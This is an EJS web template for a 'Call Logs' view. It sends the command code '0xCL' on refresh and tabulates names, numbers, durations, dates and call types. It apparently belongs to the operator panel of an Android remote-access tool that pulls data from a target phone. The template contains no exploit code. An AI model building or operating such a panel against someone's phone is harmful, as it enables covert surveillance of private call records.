<div class="card">
    <div class="card-header">
        <h2>Call Logs</h2>
        <button class="btn" onclick="sendCmd('0xCL')">Refresh</button>
    </div>
    
    <% if (!data.list || data.list.length === 0) { %>
    <p class="empty">No call logs. Click Refresh to load.</p>
    <% } else { %>
    <div class="table-wrap">
        <table>
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Number</th>
                    <th>Duration</th>
                    <th>Date</th>
                    <th>Type</th>
                </tr>
            </thead>
            <tbody>
                <% data.list.forEach(call => { 
                    const types = {1: 'Incoming', 2: 'Outgoing', 3: 'Missed'};
                    const colors = {1: 'success', 2: 'info', 3: 'error'};
                %>
                <tr>
                    <td><%= call.name || 'â€”' %></td>
                    <td><code><%= call.phoneNo %></code></td>
                    <td><%= Math.floor(call.duration / 60) %>m <%= call.duration % 60 %>s</td>
                    <td><%= new Date(parseInt(call.date)).toLocaleString() %></td>
                    <td><span class="badge <%= colors[call.type] || '' %>"><%= types[call.type] || 'Unknown' %></span></td>
                </tr>
                <% }) %>
            </tbody>
        </table>
    </div>
    <% } %>
</div>
